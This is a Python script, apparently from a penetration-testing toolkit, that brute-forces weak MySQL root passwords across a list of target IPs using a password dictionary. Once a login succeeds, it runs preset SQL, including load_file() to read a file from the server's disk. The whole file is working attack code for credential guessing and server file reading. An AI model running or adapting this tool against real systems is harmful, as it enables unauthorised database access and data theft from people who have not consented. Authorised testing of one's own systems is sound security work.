# -*- coding: utf-8 -*-
# Created by restran on 2016/10/10
from __future__ import unicode_literals, absolute_import

import logging
import os
import sys

# 把项目的目录加入的环境变量中，这样才可以导入 common.base
sys.path.insert(1, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common.base import TaskExecutor, read_dict

logger = logging.getLogger(__name__)

"""
MySQL 弱口令爆破，并执行 SQL 语句
"""

found_password = []

ip_list = read_dict('ip.txt', clear_none=True)
username_list = ['root']
database_name = 'mysql'

# sql_list = ["select load_file('D:\\111.txt')"]

sql_list = ["select load_file('D:\\111.txt')"]


def weak_pass(password, ip, db, port=3306):
    for name in username_list:
        try:
            import pymysql.cursors
            connection = pymysql.connect(host=ip,
                                         user=name,
                                         password=password,
                                         port=port,
                                         db=db)

            logger.info('[True ] %s %s:%s' % (ip, name, password))
            found_password.append((ip, '%s:%s' % (name, password)))
            # 执行sql语句
            try:
                with connection.cursor() as cursor:
                    for sql in sql_list:
                        cursor.execute(sql)
                        # 执行sql语句，插入记录
                        # sql = 'INSERT INTO employees (first_name, last_name, hire_date, gender, birth_date) VALUES (%s, %s, %s, %s, %s)'
                        # cursor.execute(sql, ('Robin', 'Zhyea', '', 'M', date(1989, 6, 14)))
                # 没有设置默认自动提交，需要主动提交，以保存所执行的语句
                connection.commit()
            except Exception as ex:
                logger.error(ex)

        except Exception as e:
            logger.info(e)
            logger.info('[False] %s %s:%s' % (ip, name, password))

    return False


def main():
    password_list = read_dict('password.dic')
    for ip in ip_list:
        executor = TaskExecutor(password_list)
        executor.run(weak_pass, ip, database_name)

    for t in found_password:
        logger.info('%s password is %s' % t)


if __name__ == "__main__":
    main()
